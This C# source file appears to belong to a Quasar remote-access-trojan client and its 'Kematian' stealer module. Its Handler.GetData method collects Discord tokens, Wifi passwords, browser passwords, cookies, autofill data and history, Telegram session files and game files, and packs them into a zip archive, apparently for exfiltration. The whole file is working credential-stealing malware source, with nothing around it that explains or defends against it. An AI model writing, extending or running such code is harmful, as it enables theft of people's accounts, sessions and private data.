using Quasar.Client.Kematian.Browsers;
using Quasar.Client.Kematian.Discord;
using Quasar.Client.Kematian.Wifi;
using Quasar.Client.Kematian.Wallets;
using Quasar.Client.Kematian.Telegram;
using Quasar.Client.Kematian.Games;
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;

namespace Quasar.Client.Kematian
{
    public class Handler
    {
        public static byte[] GetData()
        {
            byte[] data = null;
            using (var memoryStream = new MemoryStream())
            {
                using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                {
                    var retriever = new BrowsersRetriever();

                    var textMethods = new KeyValuePair<Func<string>, string>[]
                    {
                        new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
                        new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
                        new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
                        new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
                        new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
                        new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
                        new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
                    };

                    foreach (var methodPair in textMethods)
                    {
                        try
                        {
                            var content = methodPair.Key();
                            var zipEntry = archive.CreateEntry(methodPair.Value);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            using (var streamWriter = new StreamWriter(entryStream))
                            {
                                streamWriter.Write(content);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
                        }
                    }

                    try
                    {
                        var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
                        foreach (var file in telegramFiles)
                        {
                            var zipEntry = archive.CreateEntry(file.Key);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            {
                                entryStream.Write(file.Value, 0, file.Value.Length);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
                    }

                    try
                    {
                        var gameFiles = GamesRetriever.GetGameFiles();
                        foreach (var file in gameFiles)
                        {
                            var zipEntry = archive.CreateEntry(file.Key);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            {
                                entryStream.Write(file.Value, 0, file.Value.Length);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing game files: {ex.Message}");
                    }
                }
                data = memoryStream.ToArray();
            }
            return data;
        }
    }
}
